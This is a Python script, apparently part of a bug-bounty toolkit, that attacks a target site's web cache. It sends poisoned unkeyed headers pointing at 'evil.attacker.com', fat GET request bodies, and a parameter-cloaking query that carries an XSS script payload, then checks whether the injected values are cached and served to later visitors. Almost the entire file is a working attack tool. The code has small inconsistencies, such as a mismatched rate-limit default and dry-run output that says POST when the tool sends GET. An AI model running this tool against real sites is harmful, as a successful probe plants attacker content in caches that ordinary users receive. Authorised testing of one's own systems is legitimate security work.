#!/usr/bin/env python3
"""
Cache Poison Probe — tests web cache poisoning via unkeyed headers, fat GET body
injection, parameter cloaking, and hop-by-hop header manipulation.
"""
import argparse
import json
import sys
import os
import time
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed

UNKEYED_HEADERS = {
    "X-Forwarded-Host": "evil.attacker.com",
    "X-Forwarded-Scheme": "http",
    "X-Forwarded-Port": "8080",
    "X-Original-URL": "/evil-cached",
    "X-Rewrite-URL": "/evil-cached",
    "X-HTTP-Method-Override": "PUT",
    "X-HTTP-Method": "PUT",
    "X-Method-Override": "PUT",
    "X-Forwarded-Prefix": "/evil",
    "X-Forwarded-Proto": "http",
    "X-Real-IP": "6.6.6.6",
    "X-Client-IP": "7.7.7.7",
    "True-Client-IP": "8.8.8.8",
    "X-Forwarded-SSL": "off",
    "Front-End-Https": "off",
}

CACHE_DETECTION_HEADERS = ["Age", "X-Cache", "CF-Cache-Status", "X-Drupal-Cache", "X-Varnish", "Via", "Cache-Control", "Pragma"]


def load_context(context_path):
    if not context_path or not os.path.exists(context_path):
        return {}
    try:
        with open(context_path) as f:
            return json.load(f)
    except (json.JSONDecodeError, IOError) as e:
        print(f"[warn] Failed to load context: {e}", file=sys.stderr)
        return {}


def load_headers_file(path):
    headers_set = {}
    if not path or not os.path.exists(path):
        return UNKEYED_HEADERS
    with open(path) as f:
        for line in f:
            line = line.strip()
            if line and not line.startswith("#"):
                headers_set[line] = "evil.attacker.com"
    if not headers_set:
        return UNKEYED_HEADERS
    return {**headers_set, **UNKEYED_HEADERS}


def get_cache_indicators(response):
    indicators = {}
    for hdr in CACHE_DETECTION_HEADERS:
        hdr_lower = hdr.lower()
        if hdr_lower in response.headers:
            indicators[hdr] = response.headers[hdr_lower]
    if "Age" in indicators:
        indicators["cached"] = True
    if "CF-Cache-Status" in indicators:
        val = indicators["CF-Cache-Status"]
        if val.upper() in ("HIT", "EXPIRED"):
            indicators["cached"] = True
    indicators["response_time"] = getattr(response, "elapsed_seconds", lambda: 0)() if hasattr(response, "elapsed") else 0
    return indicators


def test_unkeyed_header(target, header_name, header_value, session, timeout, rate_limit):
    finding = {
        "poison_type": "unkeyed_header",
        "poison_header": header_name,
        "poison_value": header_value,
        "cache_hit": False,
        "reflected": False,
        "reflected_in_benign": False,
        "response_snippet": None,
        "success": False,
        "error": None,
        "status_poison": 0,
        "status_benign": 0,
    }

    try:
        resp1 = session.get(target, headers={header_name: header_value}, timeout=timeout, allow_redirects=False)
        finding["status_poison"] = resp1.status_code
        cache1 = get_cache_indicators(resp1)

        if rate_limit > 0:
            time.sleep(1.0 / max(1, rate_limit))

        resp2 = session.get(target, timeout=timeout, allow_redirects=False)
        finding["status_benign"] = resp2.status_code
        cache2 = get_cache_indicators(resp2)

        body1 = resp1.text or ""
        body2 = resp2.text or ""

        if header_value in body1:
            finding["reflected"] = True
            finding["response_snippet"] = body1[:300]

        if header_value in body2 and header_value not in UNKEYED_HEADERS.get(header_name, ""):
            finding["reflected_in_benign"] = True
            finding["cache_hit"] = True

            for hdr_name in CACHE_DETECTION_HEADERS:
                hdr_val = resp2.headers.get(hdr_name.lower(), "") or resp2.headers.get(hdr_name, "")
                if hdr_val:
                    finding[f"cache_header_{hdr_name}"] = hdr_val

            if "Age" in cache2 or cache2.get("cached"):
                finding["success"] = True
                print(f"[POISONED] {header_name}: value '{header_value}' reflected in cached response", file=sys.stderr)
                finding["response_snippet"] = body2[:500]

        elif finding["reflected"]:
            if cache1.get("cached"):
                finding["success"] = True
                finding["cache_hit"] = True
                print(f"[POISONED] {header_name}: reflected in response, cache hit confirmed", file=sys.stderr)

    except requests.exceptions.Timeout:
        finding["error"] = "timeout"
    except requests.exceptions.ConnectionError as e:
        finding["error"] = f"connection: {e}"
    except Exception as e:
        finding["error"] = str(e)

    return finding


def test_fat_get_poison(target, session, timeout):
    findings = []

    for hdr_name, hdr_value in list(UNKEYED_HEADERS.items())[:5]:
        finding = {
            "poison_type": "fat_get",
            "poison_header": hdr_name,
            "poison_value": hdr_value,
            "success": False,
            "cache_hit": False,
            "error": None,
        }

        try:
            poison_body = f"GET / HTTP/1.1\r\nHost: {target.split('://')[-1].split('/')[0]}\r\n{hdr_name}: {hdr_value}\r\n\r\n"

            resp1 = session.get(
                target,
                data=poison_body.encode("utf-8"),
                headers={
                    "Content-Type": "text/plain",
                    "Content-Length": str(len(poison_body)),
                },
                timeout=timeout,
                allow_redirects=False,
            )

            time.sleep(1.5)

            resp2 = session.get(target, timeout=timeout, allow_redirects=False)
            cache2 = get_cache_indicators(resp2)
            body2 = resp2.text or ""

            finding["status_poison"] = resp1.status_code
            finding["status_benign"] = resp2.status_code

            if hdr_value in body2 and cache2.get("cached"):
                finding["success"] = True
                finding["cache_hit"] = True
                finding["evidence"] = body2[:300]
                print(f"[FAT GET] {hdr_name} poisoned via GET body and cached", file=sys.stderr)

            findings.append(finding)

        except Exception as e:
            finding["error"] = str(e)
            findings.append(finding)

    return findings


def test_parameter_cloaking(target, session, timeout):
    findings = []
    cloaking_tests = [
        {"params": "callback=legit&utm_source=evil<script>alert(1)</script>", "name": "utm_source_xss"},
        {"params": "q=first_value&q=second_value", "name": "duplicate_q_param"},
        {"params": "id=123&id=456", "name": "duplicate_id_param"},
        {"params": "user=admin&user=public", "name": "duplicate_user_param"},
    ]

    for cloaking in cloaking_tests:
        finding = {
            "poison_type": "parameter_cloaking",
            "test_name": cloaking["name"],
            "parameters": cloaking["params"],
            "success": False,
            "error": None,
        }

        try:
            test_url = f"{target}?{cloaking['params']}"
            resp = session.get(test_url, timeout=timeout, allow_redirects=False)
            finding["status_code"] = resp.status_code
            finding["response_length"] = len(resp.text or "")

            if "evil" in (resp.text or "") or "456" in (resp.text or ""):
                finding["success"] = True
                finding["evidence"] = (resp.text or "")[:300]
                print(f"[CLOAKED] {cloaking['name']}: duplicate param handling confirmed via {test_url[:100]}", file=sys.stderr)

        except Exception as e:
            finding["error"] = str(e)

        findings.append(finding)

    return findings


def main():
    parser = argparse.ArgumentParser(
        description="Cache Poison Probe — unkeyed headers, fat GET, parameter cloaking",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s --target https://target.com --context .bb/context.json
  %(prog)s --target https://target.com --headers-file payloads/cache-poison-headers.txt --dry-run
  %(prog)s --target https://target.com --mode unkeyed-headers --output poison.jsonl
        """,
    )
    parser.add_argument("--context", default=None, help="Path to context.json")
    parser.add_argument("--target", required=True, help="Target URL (e.g. https://target.com)")
    parser.add_argument("--mode", default="all", choices=["all", "unkeyed-headers", "fat-get", "parameter-cloaking"], help="Poison test mode")
    parser.add_argument("--headers-file", default=None, help="File with custom poisoned headers (one per line)")
    parser.add_argument("--output", default=None, help="Output findings.jsonl path")
    parser.add_argument("--timeout", type=int, default=12, help="Request timeout in seconds (default: 12)")
    parser.add_argument("--rate-limit", type=int, default=3, help="Max requests per second (default: 5)")
    parser.add_argument("--dry-run", action="store_true", help="Print planned tests without executing")
    parser.add_argument("--proxy", default=None, help="HTTP proxy (e.g. http://127.0.0.1:8080)")
    parser.add_argument("--user-agent", default="CachePoisonProbe/1.0 (security research)", help="Custom User-Agent")
    parser.add_argument("--retries", type=int, default=2, help="Retries on failure (default: 2)")
    args = parser.parse_args()

    ctx = load_context(args.context)
    outdir = ctx.get("outdir", os.getcwd())
    evidence_dir = ctx.get("evidence_dir", os.path.join(outdir, "evidence"))
    os.makedirs(outdir, exist_ok=True)
    os.makedirs(evidence_dir, exist_ok=True)

    output_path = args.output
    if not output_path:
        output_path = os.path.join(outdir, "cache_poison_findings.jsonl")

    target = args.target.rstrip("/")
    if not target.startswith("http"):
        target = f"https://{target}"

    headers_to_test = load_headers_file(args.headers_file)
    print(f"[info] Testing {len(headers_to_test)} poison headers against {target}", file=sys.stderr)

    if args.dry_run:
        for h, v in list(headers_to_test.items())[:10]:
            print(f"[dry-run] POST {target} with header {h}: {v}", file=sys.stderr)
        print(f"[dry-run] Output would go to: {output_path}", file=sys.stderr)
        return

    session = requests.Session()
    session.headers.update({
        "User-Agent": args.user_agent,
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    })
    if args.proxy:
        session.proxies = {"http": args.proxy, "https": args.proxy}
    adapter = requests.adapters.HTTPAdapter(max_retries=args.retries)
    session.mount("https://", adapter)
    session.mount("http://", adapter)

    all_findings = []

    if args.mode in ("all", "unkeyed-headers"):
        print(f"[*] Testing {len(headers_to_test)} unkeyed headers...", file=sys.stderr)
        with ThreadPoolExecutor(max_workers=5) as executor:
            futures = {}
            for hdr_name, hdr_value in headers_to_test.items():
                future = executor.submit(test_unkeyed_header, target, hdr_name, hdr_value, session, args.timeout, args.rate_limit)
                futures[future] = hdr_name
            for future in as_completed(futures):
                try:
                    result = future.result()
                    all_findings.append(result)
                except Exception as e:
                    print(f"[err] Worker failed: {e}", file=sys.stderr)

    if args.mode in ("all", "fat-get"):
        print("[*] Testing fat GET poisoning...", file=sys.stderr)
        fat_findings = test_fat_get_poison(target, session, args.timeout)
        all_findings.extend(fat_findings)

    if args.mode in ("all", "parameter-cloaking"):
        print("[*] Testing parameter cloaking...", file=sys.stderr)
        cloak_findings = test_parameter_cloaking(target, session, args.timeout)
        all_findings.extend(cloak_findings)

    with open(output_path, "w") as outfile:
        for finding in all_findings:
            outfile.write(json.dumps(finding) + "\n")

    confirmed = [f for f in all_findings if f.get("success")]
    print(f"\n[done] {len(confirmed)}/{len(all_findings)} successful cache poisonings", file=sys.stderr)
    for c in confirmed:
        poison_type = c.get("poison_type", "unknown")
        poison_hdr = c.get("poison_header", "unknown")
        print(f"  [!] {poison_type}: {poison_hdr}")

    print(f"[done] Findings written to {output_path}", file=sys.stderr)

    summary = {
        "total_tests": len(all_findings),
        "successful_poisonings": len(confirmed),
        "target": target,
        "output_path": output_path,
    }
    print(json.dumps(summary, indent=2), file=sys.stderr)


if __name__ == "__main__":
    main()